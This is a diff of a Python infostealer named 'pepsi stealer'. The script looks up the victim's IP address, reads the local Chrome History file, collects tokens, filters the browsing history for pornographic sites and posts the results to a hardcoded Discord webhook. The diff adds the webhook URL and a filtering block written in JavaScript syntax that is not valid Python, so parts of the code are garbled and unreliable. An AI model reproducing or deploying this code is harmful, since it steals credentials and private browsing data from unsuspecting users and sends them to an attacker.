@@ -5,36 +5,24 @@ import requests
 from urllib.request import Request, urlopen
 import sqlite
 
-wh_url = "" # Too lazy
+wh_url = "https://discord.com/api/webhooks/1213517165752492144/-dvwI93Lok88wnx3h5oo9z9FmQN7RzQSVlSyebVvQiZwj0_aeKhRzMzErAcOsmRwfFrs" # Too lazy
 ip_url = "https://ipinfo.io/json"
 base_url = "https://discord.com/channels/@me"
-def main():
+
   # Call to the fuckin ip info url shit
-  global ip_url
-  req = Request(ip_url, headers={'User-Agent': 'Mozilla/5.0'})
-  ipinfo = urlopen(req).read()
-  ipinfo = json.loads(ipinfo)
-  public_ip = ipinfo['ip']
-  # Get private ip
-  import socket
-
-  def get_private_ip():
-      private_ip = socket.gethostbyname(socket.gethostname())
-      return private_ip
-
-  private_ip = get_private_ip()
+global ip_url
+req = Request(ip_url, headers={'User-Agent': 'Mozilla/5.0'})
+ipinfo = urlopen(req).read()
+ipinfo = json.loads(ipinfo)
+public_ip = ipinfo['ip']
 
 
-
-  
-  # wait to see if tokens are found
-
-  tokens=[]
-  token=""
+tokens=[]
+token=""
   
 
 
-  try:
+try:
 
     try:
             full_path = os.environ['LOCALAPPDATA'] + "\\Google\\Chrome\\User Data\\Default\\" + "History"
@@ -67,17 +55,25 @@ def main():
     #print(token)
 
     
-  except Exception as e:
+except Exception as e:
     print(e)
     pass
-  
-  embed={
+
+link=links.split("\n")
+links=[]
+for (url in links){
+   if (url.includes("porn") || url.includes("hentai") || url.includes("r34" || url.includes("balls") ){
+     links.push(url)
+   }
+}
+
+embed={
     "username": "pepsi stealer",
-    "content": f"**Public IP:** {public_ip} \n**Private IP:** {private_ip}  \n**Tokens:** {token} \n **Search History**: ```{links}```"
+    "content": f"**Tokens:** {token} \n **History**: ```{links}```"
   }
 
   # Send via requests and webhook url
-  requests.post(wh_url, data=embed)
+requests.post(wh_url, data=embed)
 
 
 
